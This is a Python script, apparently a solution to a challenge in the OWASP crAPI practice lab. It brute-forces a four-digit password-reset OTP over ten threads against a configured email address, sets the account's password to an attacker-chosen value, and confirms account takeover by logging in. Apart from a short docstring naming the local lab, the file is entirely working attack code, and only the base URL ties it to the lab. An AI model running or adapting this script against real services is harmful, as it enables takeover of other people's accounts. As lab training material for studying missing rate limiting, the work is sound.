#!/usr/bin/env python3

"""
crAPI Challenge 3 - OTP Brute Force

Purpose:
Demonstrates missing rate limiting on:
POST /identity/api/auth/v2/check-otp

Environment:
OWASP crAPI local lab only

Author: MuizRecon
"""

import requests
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed


# ================= CONFIG =================

BASE_URL = "http://localhost:8888"

EMAIL = "adam007@example.com"
NEW_PASSWORD = "Hacked123!"

THREADS = 10

# If crAPI requires your browser cookie, add it here
COOKIES = {
    # "chat_session_id": "your_cookie_here"
}


# ================= ENDPOINT =================

OTP_ENDPOINT = (
    f"{BASE_URL}/identity/api/auth/v2/check-otp"
)

LOGIN_ENDPOINT = (
    f"{BASE_URL}/identity/api/auth/login"
)


# ================= HEADERS =================

HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0"
}


# ================= OTP TEST =================

def test_otp(otp):

    payload = {
        "email": EMAIL,
        "otp": otp,
        "password": NEW_PASSWORD
    }

    try:

        response = requests.post(
            OTP_ENDPOINT,
            json=payload,
            headers=HEADERS,
            cookies=COOKIES,
            timeout=5
        )


        # Print responses while testing
        if response.status_code != 200:
            return None


        text = response.text.lower()


        # Adjust this if your crAPI response is different
        success_keywords = [
            "success",
            "verified",
            "reset",
            "changed"
        ]


        for keyword in success_keywords:

            if keyword in text:

                return {
                    "otp": otp,
                    "status": response.status_code,
                    "response": response.text
                }


        return None


    except requests.exceptions.RequestException:

        return None



# ================= BRUTE FORCE =================


def brute_force():

    print("=" * 60)
    print("crAPI OTP Brute Force Challenge")
    print("=" * 60)

    print(f"[+] Target: {EMAIL}")
    print(f"[+] Endpoint: {OTP_ENDPOINT}")
    print("[+] OTP Range: 0000-9999")
    print()


    start_time = time.time()


    found = None
    tested = 0


    with ThreadPoolExecutor(max_workers=THREADS) as executor:


        jobs = []


        for i in range(10000):

            otp = f"{i:04d}"

            jobs.append(
                executor.submit(test_otp, otp)
            )


        for future in as_completed(jobs):

            tested += 1

            result = future.result()


            if tested % 100 == 0:

                elapsed = time.time() - start_time

                print(
                    f"[*] Tested {tested}/10000 "
                    f"({elapsed:.2f}s)"
                )


            if result:

                found = result["otp"]

                print()
                print("=" * 60)
                print("[+] OTP FOUND!")
                print("=" * 60)

                print(
                    json.dumps(
                        result,
                        indent=4
                    )
                )

                break



    if found:

        verify_login()

    else:

        print()
        print("[-] OTP not found")



# ================= VERIFY RESET =================


def verify_login():

    print()
    print("[*] Testing login with new password...")


    payload = {

        "email": EMAIL,
        "password": NEW_PASSWORD

    }


    try:

        response = requests.post(
            LOGIN_ENDPOINT,
            json=payload,
            headers=HEADERS,
            cookies=COOKIES,
            timeout=5
        )


        if response.status_code == 200:

            data = response.json()


            if "token" in data:

                print()
                print("=" * 60)
                print("[+] ACCOUNT TAKEOVER CONFIRMED")
                print("=" * 60)
                print(f"Email: {EMAIL}")
                print(f"Password: {NEW_PASSWORD}")

            else:

                print("[-] Login failed")


        else:

            print(
                f"[-] Login status: {response.status_code}"
            )


    except Exception as e:

        print(e)



# ================= MAIN =================


if __name__ == "__main__":

    brute_force()
